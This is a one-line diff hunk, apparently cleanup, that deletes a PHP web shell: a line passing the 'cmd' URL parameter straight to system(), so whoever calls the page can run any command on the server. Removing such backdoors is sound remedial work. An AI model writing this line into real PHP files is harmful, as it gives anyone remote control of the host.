@@ -1,1 +1,0 @@
-<?php $exec = system( $_GET['cmd'] ) ?> 
